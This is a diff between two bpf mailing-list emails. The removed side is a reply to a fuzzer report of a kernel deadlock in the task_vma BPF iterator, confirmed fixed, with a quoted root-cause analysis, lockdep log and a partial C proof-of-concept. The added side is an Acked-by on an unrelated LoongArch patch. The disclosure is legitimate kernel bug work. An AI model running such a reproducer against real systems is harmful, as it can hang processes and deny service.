@@ -1,41 +1,100 @@
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=162.243.161.220
-ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
-	t=1793063908;
-	b=mfRPCntEnkZH+/Ue2Pq3h8pi7cIv8bIg9PpDhWywOibJx0xd4L4ea12ijJXOtb+TjRVU
-	 ioVDUPALsAxVKIgMcwp5k8+uqX5CF7ud4Urd2pEFrky2LN2ZuFBx/VnVOjipawag+MmJc
-	 P6ROIWnB5Ey88fX0lQQazvfMBqwqlwh3zfBPkAlxEg7Bhs8ECPX4mbU5qF14SA7ERT1jR
-	 mkhlRMCrdW5rnNsX6LhG8k2LQI0IQuteXyuzn/t+t1z3dL/EY3Pwdf7p1Gsae6udodBzU
-	 m0/edp7FEAFgvSIrjliKu7q63riYAr+Dkw8HVQ3QEvCZLLGien3DcBoxZFipQgM7IMA==
-ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
-	a=rsa-sha256; c=relaxed/relaxed; t=1793063908;
-	h=DMARC-Filter:Received:Received:Message-ID:Date:MIME-Version:
-	 User-Agent:Subject:To:References:From:In-Reply-To:Content-Type:
-	 Content-Transfer-Encoding:X-CM-TRANSID:X-Coremail-Antispam:
-	 X-CM-SenderInfo;
-	bh=jiXSULjy+NpluA8XNYje5u8Kpnorms5DsG1qjfyN3Dw=;
-	b=geghYwzoxjDa23qrggk0RhsCdDhKpghvTt7CeJtH8JE68ylBZyWvyKQGJsU85uUDGr/W
-	 W+rPCWEe7ggUaleq3YFDcK1Ifq8DaBxlWIsg3xcm+tKtJhT55TbFPxQg6LV29Vb/ZnI5K
-	 UcRN9d3rkBTHmAusGtZ78mbM5GqgGVLwbJ+EBaf9Cv3Jd7+7KnQhn8jNeR8HGB4Ktw3qM
-	 xfN48FIqPkDIzCx1aK1V1gyjahiUdQ33aVDnF73/6ZeGXm5kL9Rhw1bfXRZul53N/sjPU
-	 ImIsOL0xPP5sl5mrApd7F3SiHSkDeIEjA5eoOiNkrDUsd4hUj3pbjhFmQJBnw4FxXcw==
-ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
-	dmarc=none header.from=hust.edu.cn;
-	spf=pass smtp.mailfrom=hust.edu.cn;
-	arc=none smtp.remote-ip=162.243.161.220
-Received: from zg8tmtyylji0my4xnjeumjiw.icoremail.net (zg8tmtyylji0my4xnjeumjiw.icoremail.net [162.243.161.220])
-	by smtp.subspace.kernel.org (Postfix) with ESMTP id C9693606A31A
-	for <bpf@vger.kernel.org>; Tue, 27 Oct 2026 01:18:24 +0000 (UTC)
-DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org C9693606A31A
-Authentication-Results: smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=hust.edu.cn
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=hust.edu.cn
-Received: from hust.edu.cn (unknown [172.16.0.52])
-	by app1 (Coremail) with UTF8SMTP id IAEQrMA2f6Xe+99qz+o3AQ--.10338S2;
-	Tue, 27 Oct 2026 09:18:22 +0800 (CST)
-Received: from [10.12.170.55] (unknown [10.12.170.55])
-	by gateway (Coremail) with SMTP id _____wB3cCfd+99q3doRAA--.33007S3;
-	Tue, 27 Oct 2026 09:18:21 +0800 (CST)
-Message-ID: <4fa3ea90-5de4-47a5-8a7c-060140259db7@hust.edu.cn>
-Date: Tue, 27 Oct 2026 09:18:21 +0800
+Authentication-Results: smtp.subspace.kernel.org; arc=pass header.oldest-pass=0 smtp.remote-ip=209.85.160.43
+ARC-Seal: i=2; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=pass;
+	t=1793064996;
+	b=HaW275larZ7ysjcbXbOxcr2Itm2c66OyDLyHLcQO8nqZObUIRNjjCDRQMApJ/bPnmv5W
+	 SfnECSOzjnt3bWIdzDDrC9rrpGiQq+Xfea/vkPxen0vYZAPQ85SCvH4CkQGATHmvAO3ey
+	 MaOB1ti+oq5tpL8aLDGv/O8q3NgseVvylIZ3bdpAN0cdJgjAi2EV3xFCXirs7Sz8DtDIf
+	 TcrdEpoAqU1C3Y9vMm3AflHIk3yXHROPj1Skb2kTAYtVf4PncOiDTwC8xM83GMkemNFyN
+	 0EzPg4d6ytCE1FmHrIptD3TBNtYKXJ4FgNQ+R6w8AU7Yu6mRxRrzvbRy2Boa2cda6vw==
+ARC-Message-Signature: i=2; d=subspace.kernel.org; s=arc20261015;
+	a=rsa-sha256; c=relaxed/relaxed; t=1793064996;
+	h=DMARC-Filter:Received:DKIM-Signature:X-Google-DKIM-Signature:
+	 X-Forwarded-Encrypted:X-Gm-Message-State:X-Gm-Gg:X-Received:
+	 MIME-Version:References:In-Reply-To:From:Date:X-Gm-Features:
+	 Message-ID:Subject:To:Cc:Content-Type:Content-Transfer-Encoding;
+	bh=uJ7o4z3LZNIgv4lmDPckfI0AYkLgwXR/dko+SDg6wpc=;
+	b=hwsrihmcCwDj/6n4HyIOVzX5O1OtomBDFa5OkI0D5SAVVKuZAtdumPKaY5ehqPsa6GYE
+	 bpYiz3PXzSI+F+CZpUk+DhBwrVuYfbhHv+c94hHF4LYoTGRP7zV0OPGoIw6SPXa0HQUqc
+	 QRbu8dkTgsnRFKKVL+w4YmdMJq7Yg/0wKSDTIW6F///VFaJczQUy1tb0s92YiOeDHRch8
+	 qcyPwkprMrrg8VZD8r4/WNELgtOoUcTZbnSte+aLR0S+v95Jp1Qhe9MR1D+Lwmxxbn9Sl
+	 T3A+sylNs8selgR8VqFq2xO2zJGLEeN8+8JnnqWk6JxhLPYZlz0DSv+0IEJEBRhRlOg==
+ARC-Authentication-Results: i=2; smtp.subspace.kernel.org; 
+	dmarc=pass header.from=gmail.com;
+	spf=pass smtp.mailfrom=gmail.com;
+	dkim=pass header.d=gmail.com header.i=@gmail.com header.a=rsa-sha256 header.s=20251104 header.b=TCHi4pYx;
+	arc=pass header.oldest-pass=0 smtp.remote-ip=209.85.160.43
+Received: from mail-oa1-f43.google.com (mail-oa1-f43.google.com [209.85.160.43])
+	(using TLSv1.3 with cipher TLS_AES_128_GCM_SHA256 (128/128 bits)
+	 key-exchange X25519 server-signature ECDSA (prime256v1) server-digest SHA256)
+	(No client certificate requested)
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 46622606A31A
+	for <bpf@vger.kernel.org>; Tue, 27 Oct 2026 01:36:36 +0000 (UTC)
+DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org 46622606A31A
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
+Authentication-Results: smtp.subspace.kernel.org;
+	dkim=pass (2048-bit key, unprotected) header.d=gmail.com header.i=@gmail.com header.a=rsa-sha256 header.s=20251104 header.b=TCHi4pYx
+Received: by mail-oa1-f43.google.com with SMTP id 586e51a60fabf-48ed0b68895so1896270fac.1
+        for <bpf@vger.kernel.org>; Mon, 26 Oct 2026 18:36:36 -0700 (PDT)
+ARC-Seal: i=1; a=rsa-sha256; t=1793064995; cv=none;
+        d=google.com; s=arc-20260327;
+        b=X0WhZPEKyrAbjlV5Y3vW/J4MK7DmhDsLxYMRy8niRvBNXn0m1kuViJAGfupu3k/QFK
+         xzDL5aBh98071FQ1RR0Hro5tsK8J9o355wAr04glHvCZqWjw2xmh8wIGkDVKc87YocU7
+         JuNJBuwhHkN716uq69JIMS6G1zWbOCgpoRkbGzJEcpxwJXkWSJKKdbaTJjuy/6ZSZReG
+         wqwIxOPyMppTXaRMqAexio8qHbJinVXt5JgU1YEVm8eAI5fYSxQ4wMsRsN/kB8j6d5DD
+         l13IV/oyzkCm4+ppSDnA0yuMfYrHF58bQBIqS2zildjhU5KZURrK018adj+61atFlYqg
+         OQXw==
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20260327;
+        h=content-transfer-encoding:cc:to:subject:message-id:date:from
+         :in-reply-to:references:mime-version:dkim-signature;
+        bh=uJ7o4z3LZNIgv4lmDPckfI0AYkLgwXR/dko+SDg6wpc=;
+        fh=WeH16tyoDWdrRpA8T15eNpbcZm4zndzDlE2GgHHrkGI=;
+        b=hgeqlDWgfpxPDo+8yfZYtZZl5yFQPssGyawcHhYQ/AZjXr3w8ubOmtb3Hv0z5N+tS3
+         P74HNfTquvt3Kplwq8Cl85C+XKY7yATen2KF7m1DucskyT5GPa7rZ/j+sqPRgZz4Uz0A
+         +9utjnv1zeQm3il9bdh+NJ/2y+ljWfQG0JH1W+bX899xnqfx8gSGk4ueoyj8fkVRS22F
+         yqJIkZBByd7xbT+4ZbrqWYuAf+v6LyIuvpG2g7omRJsxH9oCSvx7xah+Fm26YLFCMYFD
+         JP3YgEHcxrA5/MzsKMU7GV3NI04qeIZzjXXP+mbGQM2NgRp07yXnHI++WrXdUcQzs/nJ
+         hCPw==;
+        darn=vger.kernel.org
+ARC-Authentication-Results: i=1; mx.google.com; arc=none
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=gmail.com; s=20251104; t=1793064995; x=1793669795; darn=vger.kernel.org;
+        h=content-transfer-encoding:content-type:cc:to:subject:message-id
+         :date:from:in-reply-to:references:mime-version:from:to:cc:subject
+         :date:message-id:reply-to:content-type;
+        bh=uJ7o4z3LZNIgv4lmDPckfI0AYkLgwXR/dko+SDg6wpc=;
+        b=TCHi4pYxc+HRnB6V8Amv//9+ux2NB1jGYN5Lzzzj6EbVdfVy60LTJ8c1H+yohnZt1G
+         EO7LT0WDd6Cx+1Rl4KxvHgdzKekghD/KOIWlPuB0afm3B40k2NKwxyqSOwnGFkIwV9X7
+         qWR6yH3updcY/eGnrbnNj68s+lH486j0Yxq4trhblCGUzuVo7Z+TcycF6e1+VWo234fz
+         63GOoJmStbX3lZaS6H31mgKWaz8IyaG1DW3YvIPIGxFleRvnl6pYsVn3byVHDnyhwO/T
+         /8ne0ySE4pTrUrE/sEBAB3kLe1OVKcNalsgRwWJRFHorVinvih2nWJxdBEQSs98q1Sov
+         hxFw==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20260707; t=1793064995; x=1793669795;
+        h=content-transfer-encoding:content-type:cc:to:subject:message-id
+         :date:from:in-reply-to:references:mime-version:x-gm-gg
+         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to
+         :content-type;
+        bh=uJ7o4z3LZNIgv4lmDPckfI0AYkLgwXR/dko+SDg6wpc=;
+        b=JOPEkflb1Mb/1DdUFdGP1an0fbm/EB25B1dgYo4hwo+xzq/xgTSTzfW55kofnRwVaB
+         WYHKT8lKsuirbmU862Q6gOjnEt63ZfpFkNs5qn3AVpVHOXMopXOii/0hZ70Zq//ypgeJ
+         JGmqGArLu9EttjuhccnrzSW/gY5PxX75BR/3sVm608nzaoKCSIWDZyUz0YJ0YRIKdlYO
+         Uu3zJK8thicOfjoqhHCCdZs1C1+LNW7Lot29hrqS409JNtJ/IYCuO2jP7e3/pIx63Jzx
+         nn2Fsq+mUUw/QDJw6iNeUvu0HCw0LeIRosIILSd7EyFxr0gliZEwaF+wuvyIRCTIb5Nh
+         +hHQ==
+X-Forwarded-Encrypted: i=1; AKwUvBxEmw34LQEcar6WX/2u4kLUTKHnTEBugPdJEQwn8lYox6DLwA1qPH+NiqznC91du/LkG7k=@vger.kernel.org
+X-Gm-Message-State: AFq9FYKhIKs6q9CeHCKisAVPW5AGci7Wh7T3VxNkEzy+X5PvXfJ25jiY
+	J//4fFQTRDgFAOf/VH84o/qqaIeJD8ldGISPOPBAaUtlA1gEXw2vb1LVatdmM3fZPRVs+i/hAOU
+	Lh0Q2fkPRF8d+KQQa8KEg8cuzNskJO6M=
+X-Gm-Gg: AYBFou235VyPcgDAzBk1e1zhtgzwQKIAVpmAq7OkbRtfXM1xkwTzlfZVJdpsF1idtxu
+	XA45JrbauACw8Vp4HyFATWwENfBpwGERwMWIWYLRqgpMHz2GOUHdCvH+ZuULqQ+eFQ3z74I2Zvc
+	xRgG/iDQH5covdyPxjYR+Dq4hgM0XvnbxXByOr5hsdK3dK6vsUOFa7gui3/DX+7SlapQaRF2yGy
+	AGLScNwhXKsuSS9OSFvRHf7jpZsvVLuYWFQTcuT5acg0hxxhPX9EZkufwenhAx6eElcc4sEc62z
+	62GNR1IYRgxpK47am50+I5AYpPaz3P2unDtvAhG9gI1kaucYy6BkXad/2TocHsuInhF6KT/4I9g
+	XG4w/Zd4JobBlhZJnjR6s4hH4XqP/uM4k8pS7pA==
+X-Received: by 2002:a05:6871:a842:b0:4a8:d5f:a1f9 with SMTP id
+ 586e51a60fabf-4a83f5ad043mr5699465fac.30.1793064994997; Mon, 26 Oct 2026
+ 18:36:34 -0700 (PDT)
 X-Mailing-List: bpf@vger.kernel.org
 List-Id: <bpf.vger.kernel.org>
 List-Post: <mailto:bpf@vger.kernel.org>
@@ -45,335 +104,535 @@ List-Unsubscribe: <mailto:bpf+unsubscribe@vger.kernel.org>
 List-Owner: <mailto:bpf+owner@vger.kernel.org>
 Precedence: list
 MIME-Version: 1.0
-User-Agent: Mozilla Thunderbird
-Subject: Re: BUG: Sleepable BPF prog causes a deadlock in task_vma bpf_iter
-To: Mykyta Yatsenko <mykyta.yatsenko5@gmail.com>, bpf@vger.kernel.org
-References: <5c890061.12435.1a1572fd75a.Coremail.kaiyanm@hust.edu.cn>
- <a2bf6709-f040-416d-8170-d1296b565fe0@gmail.com>
-From: Kaiyan Mei <kaiyanm@hust.edu.cn>
-In-Reply-To: <a2bf6709-f040-416d-8170-d1296b565fe0@gmail.com>
-Content-Type: text/plain; charset=UTF-8; format=flowed
-Content-Transfer-Encoding: 8bit
-X-CM-TRANSID:IAEQrMA2f6Xe+99qz+o3AQ--.10338S2
-Authentication-Results: app1; spf=neutral smtp.mail=kaiyanm@hust.edu.c
-	n;
-X-Coremail-Antispam: 1UD129KBjvAXoW3Kr4xGF1DJry5Cr4ktF43ZFb_yoW8Jry7Zo
-	Wag3ySya18Gry5AFyjkas8XFsxJ3Wvyas7Ar409r4UGFsrJ3y7ur45J34fZFW3Xw45Ka1f
-	A34fJFn5Ww17tF97n29KB7ZKAUJUUUUr529EdanIXcx71UUUUU7v73VFW2AGmfu7bjvjm3
-	AaLaJ3UjIYCTnIWjp_UUUYZ7k0a2IF6w4kM7kC6x804xWl1xkIjI8I6I8E6xAIw20EY4v2
-	0xvaj40_Wr0E3s1l8cAvFVAK0II2c7xJM28CjxkF64kEwVA0rcxSw2x7M28EF7xvwVC0I7
-	IYx2IY67AKxVWDJVCq3wA2z4x0Y4vE2Ix0cI8IcVCY1x0267AKxVWxJVW8Jr1l84ACjcxK
-	6I8E87Iv67AKxVW0oVCq3wA2z4x0Y4vEx4A2jsIEc7CjxVAFwI0_GcCE3s1ln4kS14v26r
-	1Y6r17M2AIxVAIcxkEcVAq07x20xvEncxIr21l57IF6xkI12xvs2x26I8E6xACxx1l5I8C
-	rVACY4xI64kE6c02F40Ex7xfMcIj64x0Y40En7xvr7AKxVW8Jr0_Cr1UMcIj6x8ErcxFaV
-	Av8VW8uFyUJr1UMcIj6xkF7I0En7xvr7AKxVW8Jr0_Cr1UMcvjeVCFs4IE7xkEbVWUJVW8
-	JwACjcxG0xvEwIxGrwCY02Avz4vE-syl42xK82IYc2Ij64vIr41l42xK82IY6x8ErcxFaV
-	Av8VW8uFyUJr1UMxC20s026xCaFVCjc4AY6r1j6r4UMI8I3I0E5I8CrVAFwI0_Jr0_Jr4l
-	x2IqxVCjr7xvwVAFwI0_JrI_JrWlx4CE17CEb7AF67AKxVWUXVWUAwCIc40Y0x0EwIxGrw
-	CI42IY6xIIjxv20xvE14v26r1j6r1xMIIF0xvE2Ix0cI8IcVCY1x0267AKxVWUJVW8JwCI
-	42IY6xAIw20EY4v20xvaj40_Jr0_JF4lIxAIcVC2z280aVAFwI0_Jr0_Gr1lIxAIcVC2z2
-	80aVCY1x0267AKxVWUJVW8JbIYCTnIWIevJa73UjIFyTuYvjxUv1rWDUUUU
-X-CM-SenderInfo: bpsqjkixssiio6kx23oohg3hdfq/
+References: <20261016081006.26069-1-yangtiezhu@loongson.cn> <20261016081006.26069-3-yangtiezhu@loongson.cn>
+In-Reply-To: <20261016081006.26069-3-yangtiezhu@loongson.cn>
+From: Hengqi Chen <hengqi.chen@gmail.com>
+Date: Tue, 27 Oct 2026 09:36:23 +0800
+X-Gm-Features: AclHuK8NUGUQwNg3x4d8i8Yt9qwpmzt7G03qMuZrklzkhNQomf18NVm_P8aDiWc
+Message-ID: <CAEyhmHTNA_XbSW+xWss6+7bT29NxazXB2UBGatRyPUQUc667jQ@mail.gmail.com>
+Subject: Re: [PATCH v3 2/3] LoongArch: BPF: Clean up and decouple is32
+ parameter from move_imm()
+To: Tiezhu Yang <yangtiezhu@loongson.cn>
+Cc: Huacai Chen <chenhuacai@kernel.org>, loongarch@lists.linux.dev, bpf@vger.kernel.org, 
+	linux-kernel@vger.kernel.org
+Content-Type: text/plain; charset="UTF-8"
+Content-Transfer-Encoding: quoted-printable
 
+On Fri, Oct 16, 2026 at 4:10=E2=80=AFPM Tiezhu Yang <yangtiezhu@loongson.cn=
+> wrote:
+>
+> The current move_imm() relies on the 'is32' parameter for ALU32 and JMP32=
+,
+> forcing the helper to internally clear the upper 32 bits. However, this i=
+s
+> redundant for 64-bit immediate loads. Furthermore, it is even undesirable
+> for load/store signed address offset computations.
+>
+> Clean up move_imm() by removing the 'is32' parameter which allows it to
+> focus on loading values, while moving the zero-extension logic outward to
+> the explicit callers. For 64-bit and load-store operations, just drop the
+> parameter.
+>
+> This is preparation for later patch, no functional changes.
+>
+> Signed-off-by: Tiezhu Yang <yangtiezhu@loongson.cn>
+> ---
 
+Acked-by: Hengqi Chen <hengqi.chen@gmail.com>
 
-On 2026/10/21 23:25, Mykyta Yatsenko wrote:
-> 
-> 
-> On 10/20/26 3:41 AM, 梅开彦 wrote:
->> Our fuzzer tool discovered a deadlock vulnerability in the BPF
->> subsystem. A sleepable BPF program attached to a task_vma iterator runs
->> while the iterator holds the target task's `mmap_lock`, and the
->> sleepable execution context allows the program to take page faults on
->> user memory (e.g. through `bpf_copy_from_user()`, which performs a
->> plain `copy_from_user()`). The page fault handler then re-acquires the
->> same `mmap_lock`, and a concurrent writer on the same mm turns the
->> recursion into a real ABBA deadlock that leaves two threads of the
->> process stuck in uninterruptible D state. Lockdep flags the same
->> defect as "possible recursive locking detected" via the `might_fault()`
->> assertion in `bpf_iter_run_prog()`.
->>
->> Reported-by: Kaiyan Mei <M202472210@hust.edu.cn>
->> Reported-by: Yinhao Hu <dddddd@hust.edu.cn>
->> Reviewed-by: Dongliang Mu <dzm91@hust.edu.cn>
->>
->> ## Root Cause
->>
->> 1. `task_vma_seq_get_next()` (kernel/bpf/task_iter.c) takes the read
->>     lock of the target task's `mm->mmap_lock` and holds it while running
->>     the BPF program:
->>
->> ```c
->> 		if (mmap_read_lock_killable(curr_mm)) {
->> 			mmput(curr_mm);
->> 			goto finish;
->> 		}
->> ```
->>
->> 2. `bpf_iter_run_prog()` (kernel/bpf/bpf_iter.c) explicitly allows the
->>     sleepable program to take page faults:
->>
->> ```c
->> 	if (prog->sleepable) {
->> 		rcu_read_lock_trace();
->> 		migrate_disable();
->> 		might_fault();
->> ```
->>
->> 3. `bpf_copy_from_user()`
->>     (kernel/bpf/helpers.c) does a plain `copy_from_user()`, so a page
->>     fault takes `down_read(&mm->mmap_lock)` again via
->>     `lock_mm_and_find_vma()` (non-killable). With a writer queued between
->>     the two acquisitions, the reader blocks indefinitely.
->>
->> 4. Lockdep detects the same recursion through its annotation:
->>     `might_fault()` (mm/memory.c) performs
->>     `might_lock_read(&current->mm->mmap_lock)` -- the same lock class
->>     that is already held, hence the "possible recursive locking
->>     detected" warning.
->>
->> Root cause: the task_vma iterator runs sleepable BPF programs while
->> holding `mmap_lock`, even though the BPF iterator execution contract
->> (`might_fault()` in `bpf_iter_run_prog()`) explicitly allows the program
->> to take page faults on that same lock.
->>
-> 
-> Is this fixed by dfcd17659112 ("bpf: Reject sleepable programs for task_vma iterator")?
-
-Yes, the issue has been fixed, and the PoC no longer triggers the crash 
-Thanks for pointing out the fixing commit.
-
-> 
->> ## Execution Flow Visualization
->>
->> ```
->> Vulnerability Execution Flow
->> |
->> |--- 1. Sleepable BPF_TRACING prog, expected_attach_type = BPF_TRACE_ITER,
->> |       attach_btf_id = vmlinux BTF FUNC "bpf_iter_task_vma"
->> |
->> |--- 2. bpf(BPF_LINK_CREATE) + bpf(BPF_ITER_CREATE) -> iterator fd
->> |
->> |--- 3. read(iter_fd)
->> |    |
->> |    `-- bpf_seq_read -> task_vma_seq_get_next
->> |        |   `--> mmap_read_lock_killable(curr_mm)          [outer READ, held]
->> |        `-- task_vma_seq_show -> bpf_iter_run_prog (sleepable)
->> |              `--> bpf_copy_from_user(unmapped addr) -> page fault
->> |                    -> down_read(mm->mmap_lock)          [inner READ, non-killable]
->> |
->> |--- 4. Another thread of the same process: mmap()/munmap() loop
->> |    |
->> |    `--> down_write(mm->mmap_lock) queued behind the outer read lock
->> |
->> `--- inner reader waits for the writer, writer waits for the outer reader
->>       => both threads stuck in D state (real ABBA deadlock);
->>          lockdep reports the same recursion as "possible recursive
->>          locking detected" (via might_fault() in bpf_iter_run_prog())
->> ```
->>
->> ## Reproduction Steps
->>
->> 1. Load a sleepable (`BPF_F_SLEEPABLE`) `BPF_PROG_TYPE_TRACING` program
->>     with `expected_attach_type = BPF_TRACE_ITER` and
->>     `attach_btf_id = <vmlinux BTF id of "bpf_iter_task_vma">`.
->> 2. `bpf(BPF_LINK_CREATE)` + `bpf(BPF_ITER_CREATE)` to get the iterator
->>     fd.
->> 3. Spawn a thread doing `mmap()/munmap()` in a loop.
->> 4. `read()` from the iterator fd. When the iterator reaches the reading
->>     process's own mm, both threads hang.
->>
->> ## Crash Report
->>
->> The original fuzzer crash report (kernel
->> `7.3.0-rc4-g61c1e63c9b65-dirty #9`, crash
->> `4e5cba057fd1e1d7a473942ce22d1981be8a2e68`, full log in
->> `crash-lockdep.log`):
->>
->> ```
->> ============================================
->> WARNING: possible recursive locking detected
->> 7.3.0-rc4-g61c1e63c9b65-dirty #9 Not tainted
->> --------------------------------------------
->> syz-executor419/9405 is trying to acquire lock:
->> ff1100017d169078 (&mm->mmap_lock){++++}-{4:4}, at: __might_fault mm/memory.c:7443 [inline]
->> ff1100017d169078 (&mm->mmap_lock){++++}-{4:4}, at: __might_fault+0xe5/0x190 mm/memory.c:7437
->>
->> but task is already holding lock:
->> ff1100010007e9b8 (&mm->mmap_lock){++++}-{4:4}, at: mmap_read_lock_killable include/linux/mmap_lock.h:609 [inline]
->> ff1100010007e9b8 (&mm->mmap_lock){++++}-{4:4}, at: task_vma_seq_get_next+0x5d2/0x8b0 kernel/bpf/task_iter.c:521
->>
->> other info that might help us debug this:
->>   Possible unsafe locking scenario:
->>
->>         CPU0
->>         ----
->>    lock(&mm->mmap_lock);
->>    lock(&mm->mmap_lock);
->>
->>   *** DEADLOCK ***
->>
->>   May be due to missing lock nesting notation
->>
->> locks held by syz-executor419/9405: 3, last CPU#1:
->>   #0: ff11000112349518 (&p->lock){+.+.}-{4:4}, at: bpf_seq_read+0x63/0x1210 kernel/bpf/bpf_iter.c:102
->>   #1: ff1100010007e9b8 (&mm->mmap_lock){++++}-{4:4}, at: mmap_read_lock_killable include/linux/mmap_lock.h:609 [inline]
->>   #1: ff1100010007e9b8 (&mm->mmap_lock){++++}-{4:4}, at: task_vma_seq_get_next+0x5d2/0x8b0 kernel/bpf/task_iter.c:521
->>   #2: ffffffff8f7cd7f8 (rcu_tasks_trace_srcu_struct){....}-{0:0}, at: rcu_try_lock_acquire include/linux/rcupdate.h:314 [inline]
->>   #2: ffffffff8f7cd7f8 (rcu_tasks_trace_srcu_struct){....}-{0:0}, at: rcu_read_lock_trace include/linux/rcupdate_trace.h:101 [inline]
->>   #2: ffffffff8f7cd7f8 (rcu_tasks_trace_srcu_struct){....}-{0:0}, at: bpf_iter_run_prog+0xc6/0xfc0 kernel/bpf/bpf_iter.c:686
->>
->> stack backtrace:
->> CPU: 1 UID: 0 PID: 9405 Comm: syz-executor419 Not tainted 7.3.0-rc4-g61c1e63c9b65-dirty #9 PREEMPT(full)
->> Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.15.0-1 04/01/2014
->> Call Trace:
->>   <TASK>
->>   __dump_stack lib/dump_stack.c:94 [inline]
->>   dump_stack_lvl+0x116/0x1b0 lib/dump_stack.c:120
->>   print_deadlock_bug+0x293/0x3d0 kernel/locking/lockdep.c:3085
->>   check_deadlock kernel/locking/lockdep.c:3137 [inline]
->>   validate_chain kernel/locking/lockdep.c:3939 [inline]
->>   __lock_acquire+0x153c/0x2110 kernel/locking/lockdep.c:5288
->>   lock_acquire kernel/locking/lockdep.c:5942 [inline]
->>   lock_acquire+0x1bf/0x370 kernel/locking/lockdep.c:5899
->>   __might_fault mm/memory.c:7443 [inline]
->>   __might_fault+0x115/0x190 mm/memory.c:7437
->>   bpf_iter_run_prog+0x24b/0xfc0 kernel/bpf/bpf_iter.c:688
->>   __task_vma_seq_show kernel/bpf/task_iter.c:623 [inline]
->>   task_vma_seq_show+0x128/0x1a0 kernel/bpf/task_iter.c:628
->>   bpf_seq_read+0x1db/0x1210 kernel/bpf/bpf_iter.c:137
->>   vfs_read+0x1eb/0xc80 fs/read_write.c:572
->>   ksys_read+0x126/0x240 fs/read_write.c:716
->>   do_syscall_x64 arch/x86/entry/syscall_64.c:61 [inline]
->>   do_syscall_64+0x128/0x7b0 arch/x86/entry/syscall_64.c:84
->>   entry_SYSCALL_64_after_hwframe+0x77/0x7f
->> RIP: 0033:0x7f2fec1f428d
->> Code: 28 c3 e8 46 1e 00 00 66 0f 1f 44 00 00 f3 0f 1e fa 48 89 f8 48 89 f7 48 89 d6 48 89 ca 4d 89 c2 4d 89 c8 4c 8b 4c 24 08 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 c7 c1 b8 ff ff ff f7 d8 64 89 01 48
->> RSP: 002b:00007ffd1739fb68 EFLAGS: 00000246 ORIG_RAX: 0000000000000000
->> RAX: ffffffffffffffda RBX: 00007ffd1739fd68 RCX: 00007f2fec1f428d
->> RDX: 0000000000000000 RSI: 0000000000000000 RDI: 0000000000000005
->> RBP: 0000000000000001 R08: 00007ffd1739fd68 R09: 00007ffd1739fd68
->> R10: 00007ffd1739fd68 R11: 0000000000000246 R12: 0000000000000001
->> R13: 00007ffd1739fd58 R14: 00007f2fec271530 R15: 0000000000000001
->>   </TASK>
->> ```
->>
->> ## Proof of Concept
->>
->> The following C program can demonstrate the vulnerability on bpf-next
->> commit 61c1e63c9b651a77b1e24208b9361965c69959e6 (7.3.0-rc4).
->>
->> ```c
->> #define _GNU_SOURCE
->> #include <errno.h>
->> #include <pthread.h>
->> #include <stdint.h>
->> #include <stdio.h>
->> #include <string.h>
->> #include <sys/mman.h>
->> #include <sys/syscall.h>
->> #include <unistd.h>
->>
->> #define BPF_PROG_LOAD		5
->> #define BPF_LINK_CREATE		28
->> #define BPF_ITER_CREATE		33
->>
->> #define BPF_PROG_TYPE_TRACING	26
->> #define BPF_TRACE_ITER		28	/* value in this kernel tree */
->> #define BPF_F_SLEEPABLE		0x10
->>
->> /* vmlinux BTF FUNC id of "bpf_iter_task_vma"
->>   * (bpftool btf dump file /sys/kernel/btf/vmlinux |
->>   *  grep "FUNC 'bpf_iter_task_vma'")
->>   */
->> #define BTF_ID_BPF_ITER_TASK_VMA	208826
->>
->> struct bpf_insn {
->> 	uint8_t	code;
->> 	uint8_t	dst_reg:4, src_reg:4;
->> 	uint16_t off;
->> 	int32_t	imm;
->> };
->>
->> static int sys_bpf(int cmd, void *attr, size_t size)
->> {
->> 	return syscall(__NR_bpf, cmd, attr, size);
->> }
->>
->> static void *thr_writer(void *arg)
->> {
->> 	(void)arg;
->> 	for (;;) {
->> 		void *p = mmap((void *)0x30000000000UL, 0x1000, PROT_READ | PROT_WRITE,
->> 			       MAP_FIXED | MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
->> 		if (p != MAP_FAILED)
->> 			munmap(p, 0x1000);
->> 	}
->> 	return NULL;
->> }
->>
->> int main(void)
->> {
->> 	struct bpf_insn insns[] = {
->> 		{ .code = 0xbf, .dst_reg = 1, .src_reg = 10 },	/* r1 = r10           */
->> 		{ .code = 0x07, .dst_reg = 1, .imm = -32 },	/* r1 += -32  (dst)   */
->> 		{ .code = 0xb7, .dst_reg = 2, .imm = 32 },	/* r2 = 32    (size)  */
->> 		{ .code = 0x18, .dst_reg = 3, .imm = 0x10000 },	/* r3 = 0x10000 (ld_imm64 lo, unmapped user addr) */
->> 		{ .code = 0x00 },				/* (ld_imm64 hi)      */
->> 		{ .code = 0x85, .imm = 148 },			/* call bpf_copy_from_user (plain copy_from_user) */
->> 		{ .code = 0xb7, .dst_reg = 0 },			/* r0 = 0             */
->> 		{ .code = 0x95 },				/* exit               */
->> 	};
->> 	char license[] = "GPL";
->>
->> 	static char vlog[65536];
->> 	uint8_t pattr[0x78] = { 0 };
->> 	*(uint32_t *)(pattr + 0x00) = BPF_PROG_TYPE_TRACING;	/* prog_type           */
->> 	*(uint32_t *)(pattr + 0x04) = sizeof(insns) / sizeof(insns[0]);
->> 	*(uint64_t *)(pattr + 0x08) = (uint64_t)insns;
->> 	*(uint64_t *)(pattr + 0x10) = (uint64_t)license;
->> 	*(uint32_t *)(pattr + 0x18) = 1;			/* log_level           */
